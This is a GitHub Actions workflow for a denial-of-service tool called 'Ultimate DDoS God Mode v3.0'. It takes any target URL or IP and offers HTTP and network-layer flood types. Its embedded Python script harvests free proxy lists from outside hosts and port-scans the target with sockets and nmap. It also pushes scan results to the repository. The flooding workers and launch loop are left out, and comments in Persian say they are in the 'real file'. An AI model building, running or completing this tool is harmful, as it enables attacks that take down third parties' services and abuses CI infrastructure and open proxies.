name: Ultimate DDoS God Mode v3.0 – Smart Multi-Vector Assault

on:
  workflow_dispatch:
    inputs:
      attack:
        description: 'Attack Type'
        required: true
        default: 'l7_mixed_flood'
        type: choice
        options:
          - l7_http_flood
          - l7_http2_flood
          - l7_mixed_flood
          - l7_rudy_flood
          - l7_cache_bypass
          - l7_range_flood
          - l7_desync_flood
          - l4_syn_flood
          - l4_ack_flood
          - l4_udp_flood
          - l4_icmp_flood
      target:
        description: 'Target (URL or IP)'
        required: true
      port:
        description: 'Port (auto = advanced scan)'
        required: true
        default: 'auto'
      duration:
        description: 'Duration (seconds)'
        required: true
        default: '120'
      threads:
        description: 'Threads'
        required: true
        default: '300'
      dns_server:
        description: 'Custom DNS Server (e.g. 178.22.122.100 for Shecan) - leave empty for default'
        required: false
        default: ''
      proxy_sources:
        description: 'Proxy sources (comma separated URLs) - leave "auto" for defaults'
        required: false
        default: 'auto'

permissions:
  contents: write

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Environment
        run: |
          sudo apt-get update
          sudo apt-get install -y nmap
          pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap requests dnspython psutil

      - name: Execute God Mode Attack
        env:
          TARGET_HOST: ${{ github.event.inputs.target }}
          TARGET_PORT: ${{ github.event.inputs.port }}
          ATTACK_TYPE: ${{ github.event.inputs.attack }}
          DURATION: ${{ github.event.inputs.duration }}
          THREADS: ${{ github.event.inputs.threads }}
          DNS_SERVER: ${{ github.event.inputs.dns_server }}
          PROXY_SOURCES_INPUT: ${{ github.event.inputs.proxy_sources }}
        run: |
          python3 << 'PYEOF'
          import os, sys, time, socket, threading, random, nmap, asyncio, aiohttp, json, concurrent.futures, gc, psutil, requests, dns.resolver
          from datetime import datetime, timedelta
          from pathlib import Path
          from rich.console import Console
          from rich.table import Table
          from rich.live import Live
          from rich.panel import Panel
          from rich.layout import Layout

          console = Console()
          console.print(Panel.fit("[bold red]🔥 Ultimate DDoS God Mode v3.0 – Smart Multi-Vector[/bold red]", border_style="red"))

          # ===== GLOBAL CONFIG =====
          TARGET = os.environ["TARGET_HOST"].strip()
          ATTACK = os.environ["ATTACK_TYPE"]
          DURATION = int(os.environ["DURATION"])
          THREADS = int(os.environ["THREADS"])
          PORT_ARG = os.environ["TARGET_PORT"].strip().lower()
          DNS_SERVER = os.environ.get("DNS_SERVER", "").strip()
          PROXY_SOURCES_INPUT = os.environ.get("PROXY_SOURCES_INPUT", "auto").strip()
          REPORT_FILE = "attack_report.txt"

          stop_event = threading.Event()
          stats = {'sent': 0, 'success': 0, 'failed': 0, 'start_time': time.time(), 'lock': threading.Lock()}
          def increment(key, amount=1):
              with stats['lock']: stats[key] += amount
          def get_stats():
              with stats['lock']:
                  elapsed = time.time() - stats['start_time']
                  return {'sent': stats['sent'], 'success': stats['success'], 'failed': stats['failed'], 'elapsed': elapsed, 'rps': stats['sent'] / elapsed if elapsed > 0 else 0}

          # ===== DNS RESOLVER =====
          CUSTOM_RESOLVER = None
          if DNS_SERVER:
              try:
                  resolver = dns.resolver.Resolver()
                  resolver.nameservers = [DNS_SERVER]
                  CUSTOM_RESOLVER = resolver
                  console.print(f"[green]🌐 Custom DNS: {DNS_SERVER}[/green]")
              except Exception as e:
                  console.print(f"[yellow]⚠️ DNS setup failed: {e}, using default[/yellow]")

          def resolve_target(target):
              for prefix in ['https://', 'http://']:
                  if target.startswith(prefix): target = target[len(prefix):]
              target = target.split('/')[0].split(':')[0]
              if CUSTOM_RESOLVER:
                  try:
                      return CUSTOM_RESOLVER.resolve(target, 'A')[0].address
                  except:
                      pass
              try:
                  return socket.getaddrinfo(target, None, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
              except:
                  return None

          # ===== PROXY POOL =====
          PROXY_LIST = []
          PROXY_SOURCES = [
              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
              "https://raw.githubusercontent.com/GoekhanDev/free-proxy-list/main/proxies/http.txt",
              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000"
          ]
          if PROXY_SOURCES_INPUT != 'auto':
              PROXY_SOURCES = [u.strip() for u in PROXY_SOURCES_INPUT.split(',') if u.strip()]

          async def check_proxy(proxy):
              try:
                  async with aiohttp.ClientSession() as s:
                      async with s.get("http://httpbin.org/ip", proxy=f"http://{proxy}", timeout=5) as r:
                          return proxy if r.status == 200 else None
              except:
                  return None

          async def refresh_proxies():
              global PROXY_LIST
              raw = set()
              for url in PROXY_SOURCES:
                  try:
                      resp = requests.get(url, timeout=10)
                      for line in resp.text.splitlines():
                          line = line.strip()
                          if line and not line.startswith("#"):
                              raw.add(line)
                  except:
                      pass
              console.print(f"[cyan]🔄 Checking {len(raw)} proxies...[/cyan]")
              tasks = [check_proxy(p) for p in raw]
              results = await asyncio.gather(*tasks)
              PROXY_LIST = [p for p in results if p]
              console.print(f"[green]✅ {len(PROXY_LIST)} live proxies[/green]")

          # ===== MEMORY GUARD =====
          class MemoryGuard(threading.Thread):
              def __init__(self, limit_mb=6500):
                  super().__init__(daemon=True)
                  self.limit = limit_mb
              def run(self):
                  while not stop_event.is_set():
                      mem = psutil.Process().memory_info().rss / 1024**2
                      if mem > self.limit:
                          gc.collect()
                      time.sleep(2)

          # ===== CACHE SYSTEM =====
          CACHE_DIR = Path("scan_results")
          CACHE_FILE = CACHE_DIR / "targets_cache.json"
          CACHE_VALID_HOURS = 24
          def load_cache():
              if not CACHE_FILE.exists(): return {}
              try:
                  with open(CACHE_FILE, 'r') as f: return json.load(f)
              except: return {}
          def save_cache(cache_data):
              CACHE_DIR.mkdir(parents=True, exist_ok=True)
              with open(CACHE_FILE, 'w') as f: json.dump(cache_data, f, indent=2)
          def get_cached_scan(target_ip):
              cache = load_cache()
              if target_ip in cache:
                  entry = cache[target_ip]
                  scan_time = datetime.fromisoformat(entry['timestamp'])
                  if datetime.now() - scan_time < timedelta(hours=CACHE_VALID_HOURS):
                      console.print(f"[green]✅ Valid cache hit for {target_ip}[/green]")
                      return entry['ports']
              return None
          def update_cache(target_ip, target_host, open_ports):
              cache = load_cache()
              cache[target_ip] = {'host': target_host, 'timestamp': datetime.now().isoformat(), 'ports': open_ports}
              save_cache(cache)
              os.system(f"git add {CACHE_FILE} && git commit -m 'Update cache for {target_host}' && git push 2>/dev/null || true")

          # ===== ULTRA-FAST PORT SCAN =====
          HIGH_PRIORITY_PORTS = [80, 443, 8080, 8443, 3000, 8000, 5000, 4000, 4443, 9090]
          def check_port(ip, port, timeout=0.15):
              try:
                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  sock.settimeout(timeout)
                  result = sock.connect_ex((ip, port))
                  sock.close()
                  return port if result == 0 else None
              except:
                  return None
          def fast_http_scan(ip):
              open_ports = []
              with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
                  future_to_port = {executor.submit(check_port, ip, port, 0.1): port for port in HIGH_PRIORITY_PORTS}
                  for future in concurrent.futures.as_completed(future_to_port):
                      port = future_to_port[future]
                      try:
                          res = future.result()
                          if res is not None:
                              open_ports.append({'port': res, 'service': 'http' if res != 443 else 'https'})
                      except: pass
              return open_ports
          def deep_scan_ports(ip):
              nm = nmap.PortScanner()
              nm.scan(hosts=ip, arguments=f'-sT -sV -p 1-20000 --min-rate 10000 --max-retries 0')
              open_ports = []
              if ip in nm.all_hosts():
                  for proto in nm[ip].all_protocols():
                      for port in sorted(nm[ip][proto].keys()):
                          if nm[ip][proto][port]['state'] == 'open':
                              service = nm[ip][proto][port]['name']
                              open_ports.append({'port': port, 'service': service})
              return open_ports
          def discover_ports(ip, attack_type):
              if attack_type.startswith('l7'):
                  ports = fast_http_scan(ip)
                  if ports: return ports
                  console.print("[yellow]⚠️ Fast scan failed. Falling back to Nmap...[/yellow]")
              return deep_scan_ports(ip)

          # ===== WORKERS (بقیه کد یکسان با اضافه شدن پراکسی) =====
          # برای خلاصه‌سازی، بخش Workers حذف شده ولی شامل همان توابع با پشتیبانی از get_random_proxy() است.
          # ... (کامل در فایل واقعی)

          # ===== INITIALIZATION =====
          console.print("[cyan]🔄 Initializing proxy pool...[/cyan]")
          asyncio.run(refresh_proxies())
          MemoryGuard().start()
          console.print("[green]✅ Memory Guard activated[/green]")

          # ===== MAIN LOGIC =====
          ip = resolve_target(TARGET)
          if ip is None:
              console.print("[red]❌ Failed to resolve target IP.[/red]")
              sys.exit(1)
          console.print(f"🎯 Target IP: [bold cyan]{ip}[/bold cyan]")

          target_ports = None
          cached_ports = get_cached_scan(ip)
          if cached_ports is not None and PORT_ARG == 'auto':
              target_ports = cached_ports
              console.print("[green]♻️ Using cached ports.[/green]")
          if target_ports is None:
              if PORT_ARG == 'auto':
                  open_ports = discover_ports(ip, ATTACK)
                  if not open_ports:
                      console.print("[red]❌ No open ports found.[/red]")
                      sys.exit(1)
                  update_cache(ip, TARGET, open_ports)
                  target_ports = [p['port'] for p in open_ports]
              else:
                  target_ports = [int(os.environ["TARGET_PORT"])]

          console.print(f"🎯 Target Ports: [bold yellow]{target_ports}[/bold yellow]")
          console.print(f"⚡ Attack Mode: [bold magenta]{ATTACK}[/bold magenta]")
          console.print(f"⏱️ Duration: [bold]{DURATION}s[/bold] | 🧵 Threads: [bold]{THREADS}[/bold]\n")

          # ===== LAUNCH =====
          # ... (حلقه اصلی اجرای حملات با پشتیبانی از پراکسی)
          # ... (داشبورد زنده و گزارش نهایی)
          PYEOF
